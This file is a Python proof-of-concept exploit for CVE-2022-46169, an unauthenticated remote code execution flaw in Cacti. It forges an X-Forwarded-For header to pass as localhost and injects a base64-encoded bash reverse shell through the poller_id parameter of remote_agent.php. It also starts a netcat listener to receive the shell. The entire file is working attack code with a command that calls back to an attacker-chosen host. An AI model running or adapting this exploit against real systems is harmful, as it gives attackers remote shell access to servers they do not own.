import requests
import argparse
import threading
import base64
import pexpect


proxies = {'http': 'http://127.0.0.1:8080'}


def conn_interact(port: str) -> None:
    tn = pexpect.spawn(f"/usr/bin/nc -nvlp {port}")
    tn.interact()


def send_req(target: str, port: int, payload: str, proxy: bool, host_id=50, local_id=100) -> None:
    thread = threading.Thread(target=conn_interact, args=(str(port),))
    thread.start()
    url = f"http://{target}/remote_agent.php"
    local_data_ids = [x for x in range(0, local_id)]
    print('Sending Payload')
    for i in range(host_id):
        params = {'action': 'polldata', 'host_id': i,
                  'poller_id': payload, 'local_data_ids[]': local_data_ids}
        headers = {'X-Forwarded-For': '127.0.0.1'}

        r = requests.get(url, params=params, headers=headers, proxies=proxies if proxy else None)
        if len(r.content) == 365:
            break


def main():
    parser = argparse.ArgumentParser(
        description='CVE-2022-46169 Unauthenticated RCE PoC',
        epilog='Author: Safarchand'
    )
    parser.add_argument('-t', help='IP of the system running cacti', type=str, required=True)
    parser.add_argument('-i', help='Ip of the reverse shell')
    parser.add_argument('-p', help='Port for reverse shell (change only if default:80 wont work)', default=80)
    args = parser.parse_args()

    encoded_str = base64.b64encode(f"bash -c 'bash -i >& /dev/tcp/{args.i}/{args.p} 0>&1'".encode('utf-8')).decode('utf-8')
    rev_shell = f"; /bin/bash -c 'echo {encoded_str} | base64 -d | bash'"

    try:
    # change proxy=True if you want to route traffic through burpsuite
        send_req(args.t, args.p, rev_shell, proxy=False)
    except KeyboardInterrupt:
        exit(0)


if __name__ == '__main__':
    main()
